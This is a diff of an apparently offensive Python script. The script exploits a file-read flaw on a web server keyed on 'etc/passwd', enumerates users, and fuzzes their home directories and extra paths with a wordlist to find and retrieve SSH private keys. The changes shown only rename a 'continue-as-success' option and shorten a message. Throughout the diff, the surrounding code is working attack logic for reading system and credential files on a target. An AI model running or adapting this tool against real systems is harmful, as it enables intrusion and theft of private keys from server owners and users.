@@ -167,7 +167,7 @@ def fuzz_task(user, candidate_url, session, verbose):
             print(f"{RED}[-]{RESET} Error requesting {candidate_url}: {e}")
     return None
 
-def fuzz_user(user, home, wordlist, prefix, session, all_flag, continue_as_success, verbose):
+def fuzz_user(user, home, wordlist, prefix, session, all_flag, continue_on_success, verbose):
     found = []
     candidates = []
     for key_name in wordlist:
@@ -183,7 +183,7 @@ def fuzz_user(user, home, wordlist, prefix, session, all_flag, continue_as_succe
             if result:
                 print(f"{RED}[!]{RESET} Private key found for {user} at: {result[0]}")
                 found.append(result)
-                if not continue_as_success:
+                if not continue_on_success:
                     break
             time.sleep(1)
     else:
@@ -197,13 +197,13 @@ def fuzz_user(user, home, wordlist, prefix, session, all_flag, continue_as_succe
                 if result:
                     print(f"{RED}[!]{RESET} Private key found for {user} at: {result[0]}")
                     found.append(result)
-                    if not continue_as_success:
+                    if not continue_on_success:
                         break
     if verbose and not found:
         print(f"{ORANGE}[DEBUG]{RESET} No keys found for {user}, moving to next user.")
     return found
 
-def fuzz_ssh_keys_for_users(base_url, users, wordlist, proxy, all_flag, continue_as_success, verbose, found_ssh_users):
+def fuzz_ssh_keys_for_users(base_url, users, wordlist, proxy, all_flag, continue_on_success, verbose, found_ssh_users):
     print(f"{GREEN}[+]{RESET} Starting to FUZZ")
     found_keys = []
     session = get_session(proxy)
@@ -211,7 +211,7 @@ def fuzz_ssh_keys_for_users(base_url, users, wordlist, proxy, all_flag, continue
     ordered_users = sorted(users, key=lambda x: (0 if x[0] in found_ssh_users else 1,
                                                   0 if x[2] == 0 else (x[2] if x[2] < 1000 else 10000)))
     for user, home, _ in ordered_users:
-        keys = fuzz_user(user, home, wordlist, prefix, session, all_flag, continue_as_success, verbose)
+        keys = fuzz_user(user, home, wordlist, prefix, session, all_flag, continue_on_success, verbose)
         found_keys.extend(keys)
     return found_keys
 
@@ -222,7 +222,7 @@ def fuzz_additional_paths(base_url, proxy, verbose, wordlist):
     found = []
     session = get_session(proxy)
     prefix = base_url.rsplit("etc/passwd", 1)[0]
-    print(f"{GREEN}[+]{RESET} Scanning additional directories for SSH keys using wordlist...")
+    print(f"{GREEN}[+]{RESET} Scanning additional directories for SSH keys...")
     for directory in extra_dirs:
         for key_name in wordlist:
             candidate_path = directory.rstrip("/") + "/" + key_name
@@ -267,7 +267,7 @@ def main():
     parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)", default=None)
     parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode for debugging")
     parser.add_argument("-a", "--all", action="store_true", help="Also search the entire home directory and additional paths")
-    parser.add_argument("-c", "--continue-as-success", action="store_true",
+    parser.add_argument("-c", "--continue-on-success", action="store_true",
                         help="Continue scanning all users for private keys even after a match is found")
     args = parser.parse_args()
 
@@ -289,7 +289,7 @@ def main():
             key_wordlist = [line.strip() for line in f if line.strip()]
     except FileNotFoundError:
         sys.exit(f"{RED}[-]{RESET} Wordlist file '{args.list}' not found")
-    found_keys = fuzz_ssh_keys_for_users(args.url, valid_users, key_wordlist, args.proxy, args.all, args.continue_as_success, args.verbose, found_ssh_users)
+    found_keys = fuzz_ssh_keys_for_users(args.url, valid_users, key_wordlist, args.proxy, args.all, args.continue_on_success, args.verbose, found_ssh_users)
     
     if args.all:
         extra_found = fuzz_additional_paths(args.url, args.proxy, args.verbose, key_wordlist)
